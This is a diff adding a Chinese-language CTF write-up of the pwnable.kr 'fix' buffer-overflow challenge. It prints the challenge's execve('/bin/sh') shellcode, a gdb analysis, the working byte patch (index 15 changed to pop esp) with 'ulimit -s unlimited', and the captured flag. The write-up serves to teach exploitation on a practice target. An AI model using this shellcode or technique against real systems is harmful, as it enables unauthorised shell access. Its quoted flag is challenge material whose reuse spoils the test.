@@ -14903,3 +14903,262 @@ MaMa, Gandhi was right! :)
 
 ------
 
+### fix
+
+这是**Pwnable.kr**的第三十个挑战`fix`，来自**[Rookiss]**部分。
+
+```bash
+Why bother to make your own shellcode?
+I can simply copy&paste from shell-storm.org
+so I just copied it from shell-storm then used it for my buffer overflow exercise
+but it doesn't work :(
+can you please help me to fix this??
+
+
+ssh fix@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh fix@pwnable.kr -p2222
+fix@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Sat Jun 24 22:38:33 2023 from 39.144.38.147
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+fix@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root fix  4096 Mar 29  2018 .
+drwxr-xr-x 117 root root 4096 Nov 10  2022 ..
+d---------   2 root root 4096 Jul 13  2014 .bash_history
+-r-xr-sr-x   1 root 1050 7604 Oct 26  2016 fix
+-r--r-----   1 root fix   945 Oct 26  2016 fix.c
+-r--r-----   1 root 1050   58 Jul 13  2014 flag
+-rw-r-----   1 root 1050  262 Oct 26  2016 intended_solution.txt
+dr-xr-xr-x   2 root root 4096 Aug 20  2014 .irssi
+drwxr-xr-x   2 root root 4096 Oct 23  2016 .pwntools-cache
+```
+
+输入`cat fix.c`查看`fix.c`的源代码。
+
+```c
+fix@pwnable:~$ cat fix.c
+#include <stdio.h>
+
+// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
+char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+                "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+void shellcode(){
+    // a buffer we are about to exploit!
+    char buf[20];
+
+    // prepare shellcode on executable stack!
+    strcpy(buf, sc);
+
+    // overwrite return address!
+    *(int*)(buf+32) = buf;
+
+    printf("get shell\n");
+}
+
+int main(){
+    printf("What the hell is wrong with my shellcode??????\n");
+    printf("I just copied and pasted it from shell-storm.org :(\n");
+    printf("Can you fix it for me?\n");
+
+    unsigned int index=0;
+    printf("Tell me the byte index to be fixed : ");
+    scanf("%d", &index);
+    fflush(stdin);
+
+    if(index > 22)  return 0;
+
+    int fix=0;
+    printf("Tell me the value to be patched : ");
+    scanf("%d", &fix);
+
+    // patching my shellcode
+    sc[index] = fix;
+
+    // this should work..
+    shellcode();
+    return 0;
+}
+```
+
+先反编译`shellcode`查看其汇编代码，貌似并没有问题。它功能是调用 `execve("/bin/sh", NULL, NULL)`，以获取交互式的`shell`。`$eax = 0x0b; $ebx="/bin/sh"; $ecx = 0x0; edx = 0x0;`执行`execve("/bin/sh", NULL, NULL)`。
+
+```python
+>>> from pwn import *
+>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
+   0:   31 c0                   xor    eax,eax     # $eax = 0
+   2:   50                      push   eax         # $eax的值压入栈中, 将其置为NULL
+   3:   68 2f 2f 73 68          push   0x68732f2f  # 将ASCII字符串"//sh"的反序（little-endian）压入栈中
+   8:   68 2f 62 69 6e          push   0x6e69622f  # 将ASCII字符串"/bin"的反序压入栈中
+   d:   89 e3                   mov    ebx,esp     # $ebx = "/bin/sh"
+   f:   50                      push   eax         # $eax的值压入栈中, 将其置为NULL
+  10:   53                      push   ebx         # $ebx的值压入栈中, 即"/bin/sh"的地址
+  11:   89 e1                   mov    ecx,esp     # 使$ecx指向$ebx, 此时ecx的值为参数指针argv
+  13:   b0 0b                   mov    al,0xb      # 将al寄存器的值设为系统调用号11, 表示执行execve系统调用
+  15:   cd 80                   int    0x80        # 触发软中断, 执行系统调用
+```
+
+用`gdb`进一步分析程序。
+
+```assembly
+fix@pwnable:~$ gdb ./fix
+(gdb) source /usr/share/peda/peda.py
+gdb-peda$ disassemble shellcode
+Dump of assembler code for function shellcode:
+   0x0804851b <+0>:     push   ebp         ;基址指针ebp入栈
+   0x0804851c <+1>:     mov    ebp,esp     ;将栈指针esp移入ebp
+   0x0804851e <+3>:     sub    esp,0x28    ;在栈上为局部变量buf预留空间
+   0x08048521 <+6>:     sub    esp,0x8
+   0x08048524 <+9>:     push   0x804a02c
+   0x08048529 <+14>:    lea    eax,[ebp-0x1c]  ; buf的位置在esp
+   0x0804852c <+17>:    push   eax
+   0x0804852d <+18>:    call   0x80483d0 <strcpy@plt>
+   0x08048532 <+23>:    add    esp,0x10
+   0x08048535 <+26>:    lea    eax,[ebp-0x1c]
+   0x08048538 <+29>:    add    eax,0x20
+   0x0804853b <+32>:    lea    edx,[ebp-0x1c]
+   0x0804853e <+35>:    mov    DWORD PTR [eax],edx  
+   0x08048540 <+37>:    sub    esp,0xc
+   0x08048543 <+40>:    push   0x80486b0
+   0x08048548 <+45>:    call   0x80483e0 <puts@plt>
+   0x0804854d <+50>:    add    esp,0x10
+   0x08048550 <+53>:    nop
+   0x08048551 <+54>:    leave  ; 等价于mov esp, ebp; pop ebp
+   0x08048552 <+55>:    ret    ; 等价于pop eip
+End of assembler dump.
+gdb-peda$ b *shellcode+45
+Breakpoint 1 at 0x8048548
+gdb-peda$ r
+Starting program: /home/fix/fix 
+What the hell is wrong with my shellcode??????
+I just copied and pasted it from shell-storm.org :(
+Can you fix it for me?
+Tell me the byte index to be fixed : 22
+Tell me the value to be patched : 128
+[----------------------------------registers-----------------------------------]
+EAX: 0xffdbc6bc --> 0xffdbc69c --> 0x6850c031 
+EBX: 0x0 
+ECX: 0x804a040 --> 0x80cd0b 
+EDX: 0xffdbc69c --> 0x6850c031 
+ESI: 0xf7786000 --> 0x1b2db0 
+EDI: 0xf7786000 --> 0x1b2db0 
+EBP: 0xffdbc6b8 --> 0xffdbc6d8 --> 0x0 
+ESP: 0xffdbc680 --> 0x80486b0 ("get shell")
+EIP: 0x8048548 (<shellcode+45>: call   0x80483e0 <puts@plt>)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804853e <shellcode+35>:    mov    DWORD PTR [eax],edx
+   0x8048540 <shellcode+37>:    sub    esp,0xc
+   0x8048543 <shellcode+40>:    push   0x80486b0
+=> 0x8048548 <shellcode+45>:    call   0x80483e0 <puts@plt>
+   0x804854d <shellcode+50>:    add    esp,0x10
+   0x8048550 <shellcode+53>:    nop
+   0x8048551 <shellcode+54>:    leave  
+   0x8048552 <shellcode+55>:    ret
+Guessed arguments:
+arg[0]: 0x80486b0 ("get shell")
+[------------------------------------stack-------------------------------------]
+0000| 0xffdbc680 --> 0x80486b0 ("get shell")
+0004| 0xffdbc684 --> 0x804a02c --> 0x6850c031 
+0008| 0xffdbc688 --> 0xffdbc6d8 --> 0x0 
+0012| 0xffdbc68c --> 0xf75d2700 (0xf75d2700)
+0016| 0xffdbc690 --> 0xf7786d60 --> 0xfbad2a84 
+0020| 0xffdbc694 --> 0x8048764 ("Tell me the value to be patched : ")
+0024| 0xffdbc698 --> 0xf762f0db (<__isoc99_scanf+11>:   add    ebx,0x156f25)
+0028| 0xffdbc69c --> 0x6850c031 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048548 in shellcode ()
+gdb-peda$ x/24b 0xffdbc69c
+0xffdbc69c:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0xffdbc6a4:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0xffdbc6ac:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
+gdb-peda$ x/24b $esp+0x1c
+0xffdbc69c:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0xffdbc6a4:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0xffdbc6ac:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
+gdb-peda$ x/24b &sc
+0x804a02c <sc>: 0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a034 <sc+8>:       0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a03c <sc+16>:      0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
+# 好活 第一次遇见pwnable.kr系统初始化
+Broadcast message from root@pwnable (somewhere) (Mon Jun 26 08:02:42 2023):    
+                                                                               
+24 hour interval system initialization will be started after 60 second.        
+                                                                               
+                                                                               
+Broadcast message from root@pwnable (somewhere) (Mon Jun 26 08:02:42 2023):    
+                                                                               
+all running tasks will be killed in 60 sec. save important stuffs              
+                                                                               
+                                                                               
+Broadcast message from root@pwnable (somewhere) (Mon Jun 26 08:02:42 2023):    
+                                                                               
+all files(not directory) in /tmp will be erased. so save your file inside somew
+here like /tmp/yourname                                                        
+                                                                               
+caConnection to pwnable.kr closed by remote host.
+Connection to pwnable.kr closed.
+```
+
+`shellcode`布置在栈中占了`23`个字节，`buf`变量的位置是`ebp-0x1c`（反汇编代码就能看出），所以`shellcode`尾部达到了`ebp-5`，然而函数返回执行`shellcode`时`esp`指向返回地址下面4个字节，这里相距`shellcode`有`13`字节。`push ebx` 之后的指令和栈重叠导致错误的出现，需要将`esp`的位置挪到离指令相当远的位置。修改一字节最快改变`esp`的方式只有`pop esp`，第一个`push eax`用于截断 "/bin//sh"不能更改，第`15`个字节的`push eax`对`shellcode`的影响较小，可以将它改成`pop esp`；运行到这里的栈顶为"/bin//sh"字符串，虽然可以作为地址但不符合栈的取值范围，需要用`ulimit`指令去除栈的地址范围限制：`ulimit -s unlimited`。
+
+```python
+>>> asm('pop esp').hex()
+'5c'
+>>> int('5c', 16)
+92
+>>> asm('push eax').hex()
+'50'
+```
+
+将`index`为`15`的位置改为`0x5c`（即`92`）就能拿到`shell`，输入`cat flag`得到`Sorry for blaming shell-strom.org :) it was my ignorance!`。
+
+```bash
+fix@pwnable:~$ ./fix
+What the hell is wrong with my shellcode??????
+I just copied and pasted it from shell-storm.org :(
+Can you fix it for me?
+Tell me the byte index to be fixed : 15
+Tell me the value to be patched : 92
+get shell
+Segmentation fault (core dumped)
+fix@pwnable:~$ ulimit -s unlimited
+fix@pwnable:~$ ./fix
+What the hell is wrong with my shellcode??????
+I just copied and pasted it from shell-storm.org :(
+Can you fix it for me?
+Tell me the byte index to be fixed : 15
+Tell me the value to be patched : 92
+get shell
+$ cat flag
+Sorry for blaming shell-strom.org :) it was my ignorance!
+```
+
+------
+
